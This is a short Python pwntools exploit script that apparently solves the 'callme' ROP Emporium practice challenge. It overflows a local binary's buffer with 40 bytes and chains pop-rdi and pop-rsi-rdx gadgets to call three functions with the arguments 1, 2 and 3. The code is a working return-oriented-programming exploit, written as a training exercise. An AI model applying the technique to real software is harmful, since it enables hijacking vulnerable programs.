# -*- coding: utf-8 -*-
from pwn import *

p = process("./callme")

# pop rdi ; ret
pop_rdi_ret = 0x0000000000401b23
# pop rdx ; ret
pop_rdx_ret = 0x0000000000401ab2 
pop_rsi_pop_rdx_ret = 0x0000000000401ab1 

callmeone = 0x401850
callmetwo = 0x401870 
callmethree = 0x401810

p.recvuntil("> ")
payload = 'a' * 40 + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_pop_rdx_ret) + p64(2) + p64(3) + p64(callmeone) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_pop_rdx_ret) + p64(2) + p64(3) + p64(callmetwo) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_pop_rdx_ret) + p64(2) + p64(3) + p64(callmethree)
p.sendline(payload)

p.interactive()